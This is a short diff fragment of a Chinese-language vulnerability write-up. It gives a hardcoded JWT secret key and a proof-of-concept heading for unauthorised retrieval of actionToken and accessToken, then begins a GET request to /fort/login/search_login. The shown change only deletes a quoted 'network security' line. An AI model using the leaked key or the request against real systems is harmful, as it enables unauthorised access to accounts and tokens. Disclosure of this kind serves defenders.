@@ -39,8 +39,6 @@ Jwt硬编码密钥为 `69fad654821b991725e62fb65ee464da`
 ## POC
 
 > [未授权](https://mrxn.net/tag/%E6%9C%AA%E6%8E%88%E6%9D%83)获取actionToken、accessToken
->
-> 网络安全
 
 ```
 GET /fort/login/search_login HTTP/1.1
